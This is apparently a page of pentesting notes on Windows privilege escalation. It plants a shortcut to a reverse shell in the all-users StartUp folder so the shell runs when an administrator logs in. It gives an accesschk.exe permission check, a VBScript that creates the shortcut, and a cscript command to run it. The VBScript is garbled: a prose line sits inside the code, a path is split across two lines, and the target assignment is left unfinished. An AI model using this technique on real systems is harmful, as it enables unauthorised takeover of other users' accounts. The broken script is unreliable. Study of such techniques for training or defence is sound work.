# Startup Apps

Each user can define apps that start when they log in, by placing shortcuts to them in a specific directory. Windows also has a startup directory for apps that should start for all users:

```shell
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
```

If we can create files in this directory, we can use our reverse shell executable and escalate privileges when an admin logs in.

{% hint style="info" %}
Note that shortcut files (.lnk) must be used. The following VBScript can be used:
{% endhint %}

```tsconfig
to create a shortcut file:
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "C:\ProgramData\Microsoft\Windows\Start
Menu\Programs\StartUp\reverse.lnk"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.Target
```

#### reverse.lnk is our reverse shell executable.

![](<../../../.gitbook/assets/image (158).png>)

Use accesschk.exe to check permissions on the StartUp directory:

```shell
\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
```

![](<../../../.gitbook/assets/image (157) (1).png>)

Note that the BUILTIN\Users group has write access to this directory.

Create a file CreateShortcut.vbs with the VBScript provided in a previous slide. Change file paths if necessary.

![](<../../../.gitbook/assets/image (161) (1).png>)

Run the script using cscript:

```
cscript CreateShortcut.vbs
```

![](<../../../.gitbook/assets/image (162).png>)

no we wait for the admin to login:

![](<../../../.gitbook/assets/image (156) (1).png>)
